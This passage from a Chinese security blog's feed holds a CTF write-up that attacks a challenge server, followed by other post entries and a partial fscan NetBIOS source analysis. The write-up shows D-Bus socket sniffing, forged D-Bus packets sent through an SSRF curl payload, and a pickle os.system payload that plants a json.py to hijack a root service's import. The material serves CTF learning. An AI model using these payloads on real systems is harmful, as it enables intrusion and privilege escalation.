<span class="variable">$#</span> -lt 1 ]; <span class="keyword">then</span> </span><br><span class="line">    usage</span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#解析参数</span></span><br><span class="line">parse_args $*</span><br><span class="line"> </span><br><span class="line"><span class="comment">#参数解析失败，直接退出</span></span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">unix_path_original=<span class="string">&quot;<span class="variable">$unix_path</span>.original&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Move socket files</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$&#123;unix_path&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;unix_path_original&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;&#123; rm &#x27;<span class="variable">$&#123;unix_path&#125;</span>&#x27;; mv &#x27;<span class="variable">$&#123;unix_path_original&#125;</span>&#x27; &#x27;<span class="variable">$&#123;unix_path&#125;</span>&#x27;; &#125;&quot;</span> EXIT</span><br><span class="line"> </span><br><span class="line"><span class="comment">#创建一个TCP监听，一个UNIXSocket监听</span></span><br><span class="line">socat -t100 <span class="string">&quot;TCP-LISTEN:<span class="variable">$&#123;tcp_port&#125;</span>,reuseaddr,fork&quot;</span> <span class="string">&quot;UNIX-CONNECT:<span class="variable">$&#123;unix_path_original&#125;</span>&quot;</span> &amp;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#创建一个UNIX监听和一个TCP监听</span></span><br><span class="line">socat -t100 <span class="string">&quot;UNIX-LISTEN:<span class="variable">$&#123;unix_path&#125;</span>,mode=777,reuseaddr,fork&quot;</span> <span class="string">&quot;TCP:localhost:<span class="variable">$&#123;tcp_port&#125;</span>&quot;</span> &amp;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#ARG_TCPDUMP=&quot; -i $eth_port -netvvv &quot;</span></span><br><span class="line"><span class="comment">#端口过滤</span></span><br><span class="line">ARG_TCPDUMP=<span class="variable">$ARG_TCPDUMP</span><span class="string">&quot; port <span class="variable">$tcp_port</span> &quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#是否输出抓包文件</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$pcap_switch</span> = <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    ARG_TCPDUMP=<span class="variable">$ARG_TCPDUMP</span><span class="string">&quot; -w <span class="variable">$&#123;pcap_file&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$pbits_flag</span> = <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    ARG_TCPDUMP=<span class="variable">$ARG_TCPDUMP</span><span class="string">&quot; -x&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#保存抓包数据  -i lo -netvvv -x port $tcpport -w &quot;$&#123;pcapfile&#125;&quot;</span></span><br><span class="line">tcpdump <span class="variable">$ARG_TCPDUMP</span></span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./undump.sh -u /run/dbus/system_bus_socket -f a.pcap</span><br></pre></td></tr></table></figure><br>他这边开始抓包的时候，通过 <code>dbus-send</code> 发送数据包，具体命令是（我这里忽略测试ping路由的过程）</p><blockquote><p>测试的时候只能运行第一次python，不能关了开第二次，会影响数据包中的sender</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbus-send --system --type=method_call --print-reply --dest=ctf.syncServer /ctf/syncServer ctf.syncServer.backdoor string:&quot;admin&quot; string:&quot;secretkey&quot;</span><br></pre></td></tr></table></figure><p>经过测试，发现这些数据包类似redis，可以一起发送，并且服务端那边都会解析，这边把发送的数据包全部复制下来，然后一起发送<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import socket</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将十六进制字符串转换为字节流</span></span><br><span class="line">hex_data2 = <span class="string">&quot;6c01000100000000040000004d00000001016f000f0000002f6374662f73796e635365727665720006017300040000003a312e3200000000020173000e0000006374662e73796e635365727665720000030173000400000070696e6700000000&quot;</span></span><br><span class="line">hex_data1 = \</span><br><span class="line"><span class="string">&quot;00415554482045585445524e414c2033300d0a&quot;</span>+\</span><br><span class="line"><span class="string">&quot;4e45474f54494154455f554e49585f46440d0a&quot;</span>+\</span><br><span class="line"><span class="string">&quot;424547494e0d0a6c01000100000000010000006e00000001016f00150000002f6f72672f667265656465736b746f702f4442757300000006017300140000006f72672e667265656465736b746f702e444275730000000002017300140000006f72672e667265656465736b746f702e4442757300000000030173000500000048656c6c6f000000&quot;</span>+\</span><br><span class="line"><span class="string">&quot;6c01000113000000020000007f00000001016f00150000002f6f72672f667265656465736b746f702f4442757300000006017300140000006f72672e667265656465736b746f702e444275730000000002017300140000006f72672e667265656465736b746f702e4442757300000000030173000c0000004765744e616d654f776e65720000000008016700017300000e0000006374662e73796e6353657276657200&quot;</span>+\</span><br><span class="line"><span class="string">&quot;6c01000131000000020000006800000001016f000f0000002f6374662f73796e6353657276657200020173000e0000006374662e73796e63536572766572000003017300080000006261636b646f6f720000000000000000060173000e0000006374662e73796e63536572766572000008016700027373000500000061646d696e00000020000000376630383735353865383964623764313662613064643037646537623436363000&quot;</span></span><br><span class="line">s = <span class="string">&#x27;e655097da782a691cf830ed640dbead5&#x27;</span></span><br><span class="line">hex_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    hex_str += hex(ord(c))[2:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hex_str)</span><br><span class="line">hex_data1 = hex_data1.replace(<span class="string">&quot;3766303837353538653839646237643136626130646430376465376234363630&quot;</span>,hex_str) <span class="comment"># 替换secretkey</span></span><br><span class="line">packet_data1 = binascii.unhexlify(hex_data1)</span><br><span class="line">url_encoded_data = urllib.parse.quote(packet_data1)</span><br><span class="line"><span class="built_in">print</span>(url_encoded_data)</span><br></pre></td></tr></table></figure><br>拿到url_encoded_data，发包<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=curl&amp;method=%00AUTH%20EXTERNAL%203333%0D%0ANEGOTIATE_UNIX_FD%0D%0ABEGIN%0D%0Al%01%00%01%00%00%00%00%01%00%00%00n%00%00%00%01%01o%00%15%00%00%00/org/freedesktop/DBus%00%00%00%06%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%02%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%03%01s%00%05%00%00%00Hello%00%00%00l%01%00%01%13%00%00%00%02%00%00%00%7F%00%00%00%01%01o%00%15%00%00%00/org/freedesktop/DBus%00%00%00%06%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%02%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%03%01s%00%0C%00%00%00GetNameOwner%00%00%00%00%08%01g%00%01s%00%00%0E%00%00%00ctf.syncServer%00l%01%00%011%00%00%00%02%00%00%00h%00%00%00%01%01o%00%0F%00%00%00/ctf/syncServer%00%02%01s%00%0E%00%00%00ctf.syncServer%00%00%03%01s%00%08%00%00%00backdoor%00%00%00%00%00%00%00%00%06%01s%00%0E%00%00%00ctf.syncServer%00%00%08%01g%00%02ss%00%05%00%00%00admin%00%00%00%20%00%00%00e655097da782a691cf830ed640dbead5%00&amp;url=http%3A%2F%2F127.0.0.1%3A8080%2FgetCode&amp;tcpstr=unix%3A%2F%2F%2Fvar%2Frun%2Fdbus%2Fsystem_bus_socket&amp;data=1</span><br></pre></td></tr></table></figure></p><blockquote><p>注意 <code>AUTH EXTERNAL 3333</code>，这里这个3333是当前用户的权限id，可以通过读取 <code>/etc/passwd</code> 获取，33就是3的hex，当前用户实际的id是33，如果是root那就是0对应的hex就是30</p></blockquote><p>发完就可以成功反序列化了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>找了好久，最后在 <code>flagService.py</code> 发现端倪，该服务由root权限启动<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@dbus.service.method(<span class="params"><span class="string">&quot;ctf.flag.service&quot;</span>, in_signature=<span class="string">&#x27;s&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getTime</span>(<span class="params">self, <span class="built_in">format</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;json&quot;</span>).dumps(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">1</span>, <span class="string">&quot;time&quot;</span>: time.strftime(<span class="built_in">format</span>, time.localtime())&#125;)</span><br></pre></td></tr></table></figure><br>初看以为是获取当前时间戳的，但是仔细思考发现了这个 <code>__import__(&quot;json&quot;)</code><br>当往同级目录下面写入 <code>json.py</code> 然后再去访问这个路由，他就会加载我们写入的文件，并且执行 <code>dumps</code> 函数，那么就很明了了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64,random,hashlib,time</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">r&#x27;echo &quot;import os\\ndef dumps(a):\\n\\tos.system(\&quot;touch /tmp/aaa &amp;&amp; chmod 777 /flag\&quot;)&quot; &gt; /app/json.py 2&gt;&amp;1&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure><br>先这样写入文件，然后用同样的方法获取到访问这个getTime的数据包，然后把data搞出来<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=curl&amp;method=%00AUTH%20EXTERNAL%203333%0D%0ANEGOTIATE_UNIX_FD%0D%0ABEGIN%0D%0Al%01%00%01%00%00%00%00%01%00%00%00n%00%00%00%01%01o%00%15%00%00%00/org/freedesktop/DBus%00%00%00%06%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%02%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%03%01s%00%05%00%00%00Hello%00%00%00l%01%00%01%07%00%00%00%02%00%00%00w%00%00%00%01%01o%00%11%00%00%00/ctf/flag/service%00%00%00%00%00%00%00%02%01s%00%10%00%00%00ctf.flag.service%00%00%00%00%00%00%00%00%03%01s%00%07%00%00%00getTime%00%06%01s%00%10%00%00%00ctf.flag.service%00%00%00%00%00%00%00%00%08%01g%00%01s%00%00%02%00%00%00aa%00&amp;url=http%3A%2F%2F127.0.0.1%3A8080%2FgetCode&amp;tcpstr=unix%3A%2F%2F%2Fvar%2Frun%2Fdbus%2Fsystem_bus_socket&amp;data=1</span><br></pre></td></tr></table></figure><br>然后通过php读取/flag即可</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;v-you-a-shell&quot;&gt;&lt;a href=&quot;#v-you-a-shell&quot; class=&quot;headerlink&quot; title=&quot;v_you_a_shell&quot;&gt;&lt;/a&gt;v_you_a_shell&lt;/h1&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://kaikaix.github.io/categories/ctf/"/>
    
    
    <category term="python" scheme="https://kaikaix.github.io/tags/python/"/>
    
    <category term="代码审计" scheme="https://kaikaix.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="php" scheme="https://kaikaix.github.io/tags/php/"/>
    
    <category term="ctf" scheme="https://kaikaix.github.io/tags/ctf/"/>
    
    <category term="dbus" scheme="https://kaikaix.github.io/tags/dbus/"/>
    
  </entry>
  
  <entry>
    <title>minio 漏洞</title>
    <link href="https://kaikaix.github.io/2024/01/30/minio-%E6%BC%8F%E6%B4%9E/"/>
    <id>https://kaikaix.github.io/2024/01/30/minio-%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-01-29T17:47:41.000Z</published>
    <updated>2024-01-29T17:47:41.878Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot; async&gt;&lt;/script&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>刷题4</title>
    <link href="https://kaikaix.github.io/2024/01/27/%E5%88%B7%E9%A2%984/"/>
    <id>https://kaikaix.github.io/2024/01/27/%E5%88%B7%E9%A2%984/</id>
    <published>2024-01-26T16:52:12.000Z</published>
    <updated>2024-06-09T17:47:22.589Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="766e0ddf99a29d6f2a00d9c03c1cacd620a1b2fc1bd288764b4739dc9a686384"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码阅读</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>强网杯-2023-wp</title>
    <link href="https://kaikaix.github.io/2023/12/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-2023-wp/"/>
    <id>https://kaikaix.github.io/2023/12/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-2023-wp/</id>
    <published>2023-12-25T02:26:26.000Z</published>
    <updated>2023-12-25T02:26:26.115Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot; async&gt;&lt;/script&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>nctf-2023-wp</title>
    <link href="https://kaikaix.github.io/2023/12/25/nctf-2023-wp/"/>
    <id>https://kaikaix.github.io/2023/12/25/nctf-2023-wp/</id>
    <published>2023-12-25T02:26:16.000Z</published>
    <updated>2023-12-25T02:26:16.421Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot; async&gt;&lt;/script&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>某市教育HVV总结</title>
    <link href="https://kaikaix.github.io/2023/12/21/%E6%9F%90%E5%B8%82%E6%95%99%E8%82%B2HVV%E6%80%BB%E7%BB%93/"/>
    <id>https://kaikaix.github.io/2023/12/21/%E6%9F%90%E5%B8%82%E6%95%99%E8%82%B2HVV%E6%80%BB%E7%BB%93/</id>
    <published>2023-12-21T12:25:22.000Z</published>
    <updated>2023-12-21T13:42:54.690Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="11c097e3d54fe620b5b01ac6f00cf8b56566153c184d10289e919f8e355e3c64"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码阅读</summary>
    
    
    
    <category term="实战" scheme="https://kaikaix.github.io/categories/%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="渗透测试" scheme="https://kaikaix.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="实战" scheme="https://kaikaix.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
    <category term="hvv" scheme="https://kaikaix.github.io/tags/hvv/"/>
    
  </entry>
  
  <entry>
    <title>fscan扫描DC的原理</title>
    <link href="https://kaikaix.github.io/2023/11/28/fscan%E6%89%AB%E6%8F%8FDC%E7%9A%84%E5%8E%9F%E7%90%86/"/>
    <id>https://kaikaix.github.io/2023/11/28/fscan%E6%89%AB%E6%8F%8FDC%E7%9A%84%E5%8E%9F%E7%90%86/</id>
    <published>2023-11-27T16:43:24.000Z</published>
    <updated>2023-11-28T07:39:24.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>朋友面试绿盟梅花K的时候被问到了fscan扫描DC的原理是什么，因为我也不是很清楚，刚开始以为是扫描88端口，后面调试了源码发现并不是<br><span id="more"></span></p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>首先需要一台有域控的Windows虚拟机，然后配置vscode的<code>launch.json</code><br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 使用 IntelliSense 了解相关属性。 </span></span><br><span class="line">    <span class="comment">// 悬停以查看现有属性的描述。</span></span><br><span class="line">    <span class="comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Launch Package&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;go&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;auto&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;-h&quot;</span><span class="punctuation">,</span><span class="string">&quot;192.168.3.177&quot;</span><span class="punctuation">,</span><span class="string">&quot;-np&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>接下来通过搜索关键词 <code>DC</code> ，定位到代码位于 <code>./Plugins/NetBIOS.go</code><br>接下来就可以开始调试分析了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先看向开头代码<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NetBIOS</span><span class="params">(info *common.HostInfo)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">netbios, _ := NetBIOS1(info)</span><br><span class="line">output := netbios.String()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(output) &gt; <span class="number">0</span> &#123;</span><br><span class="line">result := fmt.Sprintf(<span class="string">&quot;[*] NetBios: %-15s %s&quot;</span>, info.Host, output)</span><br><span class="line">common.LogSuccess(result)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> netbioserr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>先分析第一个函数<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NetBIOS1</span><span class="params">(info *common.HostInfo)</span></span> (netbios NetBiosInfo, err <span class="type">error</span>) &#123;</span><br><span class="line">netbios, err = GetNbnsname(info)</span><br><span class="line"><span class="keyword">var</span> payload0 []<span class="type">byte</span></span><br><span class="line"><span class="keyword">if</span> netbios.ServerService != <span class="string">&quot;&quot;</span> || netbios.WorkstationService != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">ss := netbios.ServerService</span><br><span class="line"><span class="keyword">if</span> ss == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">ss = netbios.WorkstationService</span><br><span class="line">&#125;</span><br><span class="line">name := netbiosEncode(ss)</span><br><span class="line">payload0 = <span class="built_in">append</span>(payload0, []<span class="type">byte</span>(<span class="string">&quot;\x81\x00\x00D &quot;</span>)...)</span><br><span class="line">payload0 = <span class="built_in">append</span>(payload0, name...)</span><br><span class="line">payload0 = <span class="built_in">append</span>(payload0, []<span class="type">byte</span>(<span class="string">&quot;\x00 EOENEBFACACACACACACACACACACACACA\x00&quot;</span>)...)</span><br><span class="line">&#125;</span><br><span class="line">realhost := fmt.Sprintf(<span class="string">&quot;%s:%v&quot;</span>, info.Host, info.Ports)</span><br><span class="line"><span class="keyword">var</span> conn net.Conn</span><br><span class="line">conn, err = common.WrapperTcpWithTimeout(<span class="string">&quot;tcp&quot;</span>, realhost, time.Duration(common.Timeout)*time.Second)</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> conn != <span class="literal">nil</span> &#123;</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = conn.SetDeadline(time.Now().Add(time.Duration(common.Timeout) * time.Second))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> info.Ports == <span class="string">&quot;139&quot;</span> &amp;&amp; <span class="built_in">len</span>(payload0) &gt; <span class="number">0</span> &#123;</span><br><span class="line">_, err1 := conn.Write(payload0)</span><br><span class="line"><span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">_, err1 = ReadBytes(conn)</span><br><span class="line"><span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_, err = conn.Write(NegotiateSMBv1Data1)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">_, err = ReadBytes(conn)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_, err = conn.Write(NegotiateSMBv1Data2)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ret []<span class="type">byte</span></span><br><span class="line">ret, err = ReadBytes(conn)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">netbios2, err := ParseNTLM(ret)</span><br><span class="line">JoinNetBios(&amp;netbios, &amp;netbios2)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>首先调用了<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetNbnsname</span><span class="params">(info *common.HostInfo)</span></span> (netbios NetBiosInfo, err <span class="type">error</span>) &#123;</span><br><span class="line">senddata1 := []<span class="type">byte</span>&#123;<span class="number">102</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span 